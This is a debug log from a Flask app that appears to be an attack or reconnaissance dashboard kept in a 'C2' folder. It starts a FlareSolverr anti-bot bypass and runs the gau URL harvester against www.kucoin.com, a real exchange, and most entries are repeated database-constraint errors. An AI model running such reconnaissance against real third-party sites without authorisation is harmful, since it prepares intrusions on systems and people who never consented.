2025-06-22 21:06:08 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [22/Jun/2025 21:06:08] "GET /attack/1 HTTP/1.1" 200 -
2025-06-22 21:06:08 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [22/Jun/2025 21:06:08] "[36mGET /static/js/dist/bundle.js HTTP/1.1[0m" 304 -
2025-06-22 21:06:08 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [22/Jun/2025 21:06:08] "[36mGET /static/css/attack.css HTTP/1.1[0m" 304 -
2025-06-22 21:06:08 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [22/Jun/2025 21:06:08] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-22 21:06:09 | INFO     | Gau_route.py:377 | gau_dashboard() | 正在載入 Gau 掃描器界面
2025-06-22 21:06:09 | INFO     | Gau_route.py:377 | gau_dashboard() | 正在載入 Gau 掃描器界面
2025-06-22 21:06:09 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [22/Jun/2025 21:06:09] "GET /api/gau/dashboard?target_id=1 HTTP/1.1" 200 -
2025-06-22 21:06:09 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [22/Jun/2025 21:06:09] "[36mGET /static/js/gau_dashboard.js HTTP/1.1[0m" 304 -
2025-06-22 21:06:09 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [22/Jun/2025 21:06:09] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-22 21:06:09 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [22/Jun/2025 21:06:09] "GET /api/gau/history/1 HTTP/1.1" 200 -
2025-06-22 21:06:09 | INFO     | Gau_route.py:188 | gau_get_result() | DEBUG: gau_get_result called with target_id=1
2025-06-22 21:06:09 | INFO     | Gau_route.py:188 | gau_get_result() | DEBUG: gau_get_result called with target_id=1
2025-06-22 21:06:09 | INFO     | Gau_route.py:202 | gau_get_result() | DEBUG: Query parameters - page=1, per_page=50, category=all
2025-06-22 21:06:09 | INFO     | Gau_route.py:202 | gau_get_result() | DEBUG: Query parameters - page=1, per_page=50, category=all
2025-06-22 21:06:09 | INFO     | Gau_route.py:207 | gau_get_result() | DEBUG: scan_result found: True
2025-06-22 21:06:09 | INFO     | Gau_route.py:207 | gau_get_result() | DEBUG: scan_result found: True
2025-06-22 21:06:09 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [22/Jun/2025 21:06:09] "GET /api/gau/result/1?page=1&per_page=50&category=all&search= HTTP/1.1" 200 -
2025-06-22 21:06:09 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [22/Jun/2025 21:06:09] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-22 21:06:09 | INFO     | Gau_route.py:73 | gau_scan() | Scan parameters: threads=50, providers=wayback,commoncrawl,otx,urlscan, exclude_extensions=[], blacklist=ttf,woff,svg,png,jpg,gif,jpeg,ico
2025-06-22 21:06:09 | INFO     | Gau_route.py:73 | gau_scan() | Scan parameters: threads=50, providers=wayback,commoncrawl,otx,urlscan, exclude_extensions=[], blacklist=ttf,woff,svg,png,jpg,gif,jpeg,ico
2025-06-22 21:06:09 | INFO     | Gau_route.py:100 | gau_scan() | 已删除旧的扫描结果: target_id=1
2025-06-22 21:06:09 | INFO     | Gau_route.py:100 | gau_scan() | 已删除旧的扫描结果: target_id=1
2025-06-22 21:06:09 | WARNING  | Gau_route.py:116 | gau_scan() | 數據庫操作失敗 (嘗試 1/3): (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.kucoin.com', '[]', 0, 'scanning', None, '2025-06-22 21:06:09.913200')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-22 21:06:09 | WARNING  | Gau_route.py:116 | gau_scan() | 數據庫操作失敗 (嘗試 1/3): (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.kucoin.com', '[]', 0, 'scanning', None, '2025-06-22 21:06:09.913200')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-22 21:06:10 | INFO     | Gau_route.py:100 | gau_scan() | 已删除旧的扫描结果: target_id=1
2025-06-22 21:06:10 | INFO     | Gau_route.py:100 | gau_scan() | 已删除旧的扫描结果: target_id=1
2025-06-22 21:06:10 | WARNING  | Gau_route.py:116 | gau_scan() | 數據庫操作失敗 (嘗試 2/3): (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.kucoin.com', '[]', 0, 'scanning', None, '2025-06-22 21:06:10.416073')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-22 21:06:10 | WARNING  | Gau_route.py:116 | gau_scan() | 數據庫操作失敗 (嘗試 2/3): (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.kucoin.com', '[]', 0, 'scanning', None, '2025-06-22 21:06:10.416073')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-22 21:06:11 | INFO     | Gau_route.py:100 | gau_scan() | 已删除旧的扫描结果: target_id=1
2025-06-22 21:06:11 | INFO     | Gau_route.py:100 | gau_scan() | 已删除旧的扫描结果: target_id=1
2025-06-22 21:06:11 | WARNING  | Gau_route.py:116 | gau_scan() | 數據庫操作失敗 (嘗試 3/3): (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.kucoin.com', '[]', 0, 'scanning', None, '2025-06-22 21:06:11.418074')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-22 21:06:11 | WARNING  | Gau_route.py:116 | gau_scan() | 數據庫操作失敗 (嘗試 3/3): (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.kucoin.com', '[]', 0, 'scanning', None, '2025-06-22 21:06:11.418074')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-22 21:06:11 | ERROR    | Gau_route.py:120 | gau_scan() | 创建扫描记录失败，已重試 3 次: (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.kucoin.com', '[]', 0, 'scanning', None, '2025-06-22 21:06:11.418074')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-22 21:06:11 | ERROR    | Gau_route.py:120 | gau_scan() | 创建扫描记录失败，已重試 3 次: (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.kucoin.com', '[]', 0, 'scanning', None, '2025-06-22 21:06:11.418074')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-22 21:06:11 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [22/Jun/2025 21:06:11] "[35m[1mPOST /api/gau/scan/1 HTTP/1.1[0m" 503 -
2025-06-22 21:07:13 | INFO     | Gau_route.py:73 | gau_scan() | Scan parameters: threads=50, providers=wayback,commoncrawl,otx,urlscan, exclude_extensions=[], blacklist=ttf,woff,svg,png,jpg,gif,jpeg,ico
2025-06-22 21:07:13 | INFO     | Gau_route.py:73 | gau_scan() | Scan parameters: threads=50, providers=wayback,commoncrawl,otx,urlscan, exclude_extensions=[], blacklist=ttf,woff,svg,png,jpg,gif,jpeg,ico
2025-06-22 21:07:13 | INFO     | Gau_route.py:100 | gau_scan() | 已删除旧的扫描结果: target_id=1
2025-06-22 21:07:13 | INFO     | Gau_route.py:100 | gau_scan() | 已删除旧的扫描结果: target_id=1
2025-06-22 21:07:13 | WARNING  | Gau_route.py:116 | gau_scan() | 數據庫操作失敗 (嘗試 1/3): (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.kucoin.com', '[]', 0, 'scanning', None, '2025-06-22 21:07:13.449552')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-22 21:07:13 | WARNING  | Gau_route.py:116 | gau_scan() | 數據庫操作失敗 (嘗試 1/3): (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.kucoin.com', '[]', 0, 'scanning', None, '2025-06-22 21:07:13.449552')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-22 21:07:13 | INFO     | Gau_route.py:100 | gau_scan() | 已删除旧的扫描结果: target_id=1
2025-06-22 21:07:13 | INFO     | Gau_route.py:100 | gau_scan() | 已删除旧的扫描结果: target_id=1
2025-06-22 21:07:13 | WARNING  | Gau_route.py:116 | gau_scan() | 數據庫操作失敗 (嘗試 2/3): (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.kucoin.com', '[]', 0, 'scanning', None, '2025-06-22 21:07:13.950875')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-22 21:07:13 | WARNING  | Gau_route.py:116 | gau_scan() | 數據庫操作失敗 (嘗試 2/3): (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.kucoin.com', '[]', 0, 'scanning', None, '2025-06-22 21:07:13.950875')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-22 21:07:14 | INFO     | Gau_route.py:100 | gau_scan() | 已删除旧的扫描结果: target_id=1
2025-06-22 21:07:14 | INFO     | Gau_route.py:100 | gau_scan() | 已删除旧的扫描结果: target_id=1
2025-06-22 21:07:14 | WARNING  | Gau_route.py:116 | gau_scan() | 數據庫操作失敗 (嘗試 3/3): (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.kucoin.com', '[]', 0, 'scanning', None, '2025-06-22 21:07:14.952045')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-22 21:07:14 | WARNING  | Gau_route.py:116 | gau_scan() | 數據庫操作失敗 (嘗試 3/3): (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.kucoin.com', '[]', 0, 'scanning', None, '2025-06-22 21:07:14.952045')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-22 21:07:14 | ERROR    | Gau_route.py:120 | gau_scan() | 创建扫描记录失败，已重試 3 次: (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.kucoin.com', '[]', 0, 'scanning', None, '2025-06-22 21:07:14.952045')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-22 21:07:14 | ERROR    | Gau_route.py:120 | gau_scan() | 创建扫描记录失败，已重試 3 次: (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.kucoin.com', '[]', 0, 'scanning', None, '2025-06-22 21:07:14.952045')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-22 21:07:14 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [22/Jun/2025 21:07:14] "[35m[1mPOST /api/gau/scan/1 HTTP/1.1[0m" 503 -
2025-06-22 21:07:23 | INFO     | Gau_route.py:73 | gau_scan() | Scan parameters: threads=50, providers=wayback,commoncrawl,otx,urlscan, exclude_extensions=[], blacklist=ttf,woff,svg,png,jpg,gif,jpeg,ico
2025-06-22 21:07:23 | INFO     | Gau_route.py:73 | gau_scan() | Scan parameters: threads=50, providers=wayback,commoncrawl,otx,urlscan, exclude_extensions=[], blacklist=ttf,woff,svg,png,jpg,gif,jpeg,ico
2025-06-22 21:07:23 | INFO     | Gau_route.py:100 | gau_scan() | 已删除旧的扫描结果: target_id=1
2025-06-22 21:07:23 | INFO     | Gau_route.py:100 | gau_scan() | 已删除旧的扫描结果: target_id=1
2025-06-22 21:07:23 | WARNING  | Gau_route.py:116 | gau_scan() | 數據庫操作失敗 (嘗試 1/3): (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.kucoin.com', '[]', 0, 'scanning', None, '2025-06-22 21:07:23.511705')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-22 21:07:23 | WARNING  | Gau_route.py:116 | gau_scan() | 數據庫操作失敗 (嘗試 1/3): (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.kucoin.com', '[]', 0, 'scanning', None, '2025-06-22 21:07:23.511705')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-22 21:07:24 | INFO     | Gau_route.py:100 | gau_scan() | 已删除旧的扫描结果: target_id=1
2025-06-22 21:07:24 | INFO     | Gau_route.py:100 | gau_scan() | 已删除旧的扫描结果: target_id=1
2025-06-22 21:07:24 | WARNING  | Gau_route.py:116 | gau_scan() | 數據庫操作失敗 (嘗試 2/3): (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.kucoin.com', '[]', 0, 'scanning', None, '2025-06-22 21:07:24.014175')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-22 21:07:24 | WARNING  | Gau_route.py:116 | gau_scan() | 數據庫操作失敗 (嘗試 2/3): (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.kucoin.com', '[]', 0, 'scanning', None, '2025-06-22 21:07:24.014175')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-22 21:07:25 | INFO     | Gau_route.py:100 | gau_scan() | 已删除旧的扫描结果: target_id=1
2025-06-22 21:07:25 | INFO     | Gau_route.py:100 | gau_scan() | 已删除旧的扫描结果: target_id=1
2025-06-22 21:07:25 | WARNING  | Gau_route.py:116 | gau_scan() | 數據庫操作失敗 (嘗試 3/3): (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.kucoin.com', '[]', 0, 'scanning', None, '2025-06-22 21:07:25.016137')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-22 21:07:25 | WARNING  | Gau_route.py:116 | gau_scan() | 數據庫操作失敗 (嘗試 3/3): (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.kucoin.com', '[]', 0, 'scanning', None, '2025-06-22 21:07:25.016137')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-22 21:07:25 | ERROR    | Gau_route.py:120 | gau_scan() | 创建扫描记录失败，已重試 3 次: (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.kucoin.com', '[]', 0, 'scanning', None, '2025-06-22 21:07:25.016137')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-22 21:07:25 | ERROR    | Gau_route.py:120 | gau_scan() | 创建扫描记录失败，已重試 3 次: (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.kucoin.com', '[]', 0, 'scanning', None, '2025-06-22 21:07:25.016137')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-22 21:07:25 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [22/Jun/2025 21:07:25] "[35m[1mPOST /api/gau/scan/1 HTTP/1.1[0m" 503 -
2025-06-22 21:11:13 | INFO     | config.py:168 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-22 21:11:13 | INFO     | config.py:168 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-22 21:11:13 | DEBUG    | config.py:169 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-22 21:11:13 | DEBUG    | config.py:169 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-22 21:11:13 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-22 21:11:13 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-22 21:11:13 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-22 21:11:13 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-22 21:11:13 | INFO     | start_flaresolverr.py:59 | start_flaresolverr() | FlareSolverr 已經在運行
2025-06-22 21:11:13 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-22 21:11:13 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-22 21:13:26 | INFO     | Gau_route.py:73 | gau_scan() | Scan parameters: threads=50, providers=wayback,commoncrawl,otx,urlscan, exclude_extensions=[], blacklist=ttf,woff,svg,png,jpg,gif,jpeg,ico
2025-06-22 21:13:26 | INFO     | Gau_route.py:73 | gau_scan() | Scan parameters: threads=50, providers=wayback,commoncrawl,otx,urlscan, exclude_extensions=[], blacklist=ttf,woff,svg,png,jpg,gif,jpeg,ico
2025-06-22 21:13:26 | INFO     | Gau_route.py:100 | gau_scan() | 已删除旧的扫描结果: target_id=1
2025-06-22 21:13:26 | INFO     | Gau_route.py:100 | gau_scan() | 已删除旧的扫描结果: target_id=1
2025-06-22 21:13:26 | WARNING  | Gau_route.py:116 | gau_scan() | 數據庫操作失敗 (嘗試 1/3): (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.kucoin.com', '[]', 0, 'scanning', None, '2025-06-22 21:13:26.940859')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-22 21:13:26 | WARNING  | Gau_route.py:116 | gau_scan() | 數據庫操作失敗 (嘗試 1/3): (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.kucoin.com', '[]', 0, 'scanning', None, '2025-06-22 21:13:26.940859')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-22 21:13:27 | INFO     | Gau_route.py:100 | gau_scan() | 已删除旧的扫描结果: target_id=1
2025-06-22 21:13:27 | INFO     | Gau_route.py:100 | gau_scan() | 已删除旧的扫描结果: target_id=1
2025-06-22 21:13:27 | WARNING  | Gau_route.py:116 | gau_scan() | 數據庫操作失敗 (嘗試 2/3): (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.kucoin.com', '[]', 0, 'scanning', None, '2025-06-22 21:13:27.443104')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-22 21:13:27 | WARNING  | Gau_route.py:116 | gau_scan() | 數據庫操作失敗 (嘗試 2/3): (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.kucoin.com', '[]', 0, 'scanning', None, '2025-06-22 21:13:27.443104')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-22 21:13:28 | INFO     | Gau_route.py:100 | gau_scan() | 已删除旧的扫描结果: target_id=1
2025-06-22 21:13:28 | INFO     | Gau_route.py:100 | gau_scan() | 已删除旧的扫描结果: target_id=1
2025-06-22 21:13:28 | WARNING  | Gau_route.py:116 | gau_scan() | 數據庫操作失敗 (嘗試 3/3): (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.kucoin.com', '[]', 0, 'scanning', None, '2025-06-22 21:13:28.445367')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-22 21:13:28 | WARNING  | Gau_route.py:116 | gau_scan() | 數據庫操作失敗 (嘗試 3/3): (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.kucoin.com', '[]', 0, 'scanning', None, '2025-06-22 21:13:28.445367')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-22 21:13:28 | ERROR    | Gau_route.py:120 | gau_scan() | 创建扫描记录失败，已重試 3 次: (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.kucoin.com', '[]', 0, 'scanning', None, '2025-06-22 21:13:28.445367')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-22 21:13:28 | ERROR    | Gau_route.py:120 | gau_scan() | 创建扫描记录失败，已重試 3 次: (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.kucoin.com', '[]', 0, 'scanning', None, '2025-06-22 21:13:28.445367')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-22 21:13:28 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [22/Jun/2025 21:13:28] "[35m[1mPOST /api/gau/scan/1 HTTP/1.1[0m" 503 -
2025-06-22 21:13:36 | INFO     | config.py:168 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-22 21:13:36 | INFO     | config.py:168 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-22 21:13:36 | DEBUG    | config.py:169 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-22 21:13:36 | DEBUG    | config.py:169 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-22 21:13:36 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-22 21:13:36 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-22 21:13:36 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-22 21:13:36 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-22 21:13:36 | INFO     | start_flaresolverr.py:77 | start_flaresolverr() | 正在啟動 FlareSolverr: /home/hacker/Desktop/C2/tools/FlareSolverr/src/flaresolverr.py
2025-06-22 21:13:40 | INFO     | start_flaresolverr.py:104 | start_flaresolverr() | FlareSolverr 啟動成功，運行在 http://localhost:8191
2025-06-22 21:13:40 | INFO     | start_flaresolverr.py:242 | start_monitoring() | FlareSolverr 監控已啟動
2025-06-22 21:13:40 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-22 21:13:40 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-22 21:13:40 | INFO     | _internal.py:97 | _log() | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:8964
2025-06-22 21:13:40 | INFO     | _internal.py:97 | _log() | [33mPress CTRL+C to quit[0m
2025-06-22 21:13:44 | INFO     | Gau_route.py:73 | gau_scan() | Scan parameters: threads=50, providers=wayback,commoncrawl,otx,urlscan, exclude_extensions=[], blacklist=ttf,woff,svg,png,jpg,gif,jpeg,ico
2025-06-22 21:13:44 | INFO     | Gau_route.py:73 | gau_scan() | Scan parameters: threads=50, providers=wayback,commoncrawl,otx,urlscan, exclude_extensions=[], blacklist=ttf,woff,svg,png,jpg,gif,jpeg,ico
2025-06-22 21:13:44 | INFO     | Gau_route.py:107 | gau_scan() | 已更新現有掃描結果: target_id=1
2025-06-22 21:13:44 | INFO     | Gau_route.py:107 | gau_scan() | 已更新現有掃描結果: target_id=1
2025-06-22 21:13:44 | INFO     | Gau_route.py:119 | gau_scan() | 數據庫操作成功完成: target_id=1
2025-06-22 21:13:44 | INFO     | Gau_route.py:119 | gau_scan() | 數據庫操作成功完成: target_id=1
2025-06-22 21:13:44 | INFO     | Gau_route.py:164 | gau_scan() | Final scan options: {'threads': 50, 'providers': 'wayback,commoncrawl,otx,urlscan', 'blacklist': 'ttf,woff,svg,png,jpg,gif,jpeg,ico', 'verbose': False}
2025-06-22 21:13:44 | INFO     | Gau_route.py:164 | gau_scan() | Final scan options: {'threads': 50, 'providers': 'wayback,commoncrawl,otx,urlscan', 'blacklist': 'ttf,woff,svg,png,jpg,gif,jpeg,ico', 'verbose': False}
2025-06-22 21:13:44 | INFO     | thread_gau.py:482 | start_gau_scan() | 已启动Gau扫描，目标ID: 1
2025-06-22 21:13:44 | INFO     | thread_gau.py:99 | _create_or_update_scan_result() | 更新現有Gau掃描結果，目標ID: 1
2025-06-22 21:13:44 | INFO     | thread_gau.py:482 | start_gau_scan() | 已启动Gau扫描，目标ID: 1
2025-06-22 21:13:44 | INFO     | thread_gau.py:99 | _create_or_update_scan_result() | 更新現有Gau掃描結果，目標ID: 1
2025-06-22 21:13:44 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [22/Jun/2025 21:13:44] "POST /api/gau/scan/1 HTTP/1.1" 200 -
2025-06-22 21:13:44 | INFO     | thread_gau.py:255 | _execute_gau_scan() | 执行命令: /home/hacker/Desktop/C2/tools/gau_linux/gau www.kucoin.com --o /home/hacker/Desktop/C2/output/gau/gau_1_1750598024.txt --threads 50 --timeout 20 --retries 2 --from 202306 --providers wayback,commoncrawl,otx,urlscan --fp --blacklist ttf,woff,svg,png,jpg,gif,jpeg,ico
2025-06-22 21:13:44 | INFO     | thread_gau.py:255 | _execute_gau_scan() | 执行命令: /home/hacker/Desktop/C2/tools/gau_linux/gau www.kucoin.com --o /home/hacker/Desktop/C2/output/gau/gau_1_1750598024.txt --threads 50 --timeout 20 --retries 2 --from 202306 --providers wayback,commoncrawl,otx,urlscan --fp --blacklist ttf,woff,svg,png,jpg,gif,jpeg,ico
2025-06-22 21:13:47 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [22/Jun/2025 21:13:47] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-22 21:13:50 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [22/Jun/2025 21:13:50] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-22 21:13:53 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [22/Jun/2025 21:13:53] "GET /api/gau/status/1 HTTP/1.1" 200 -
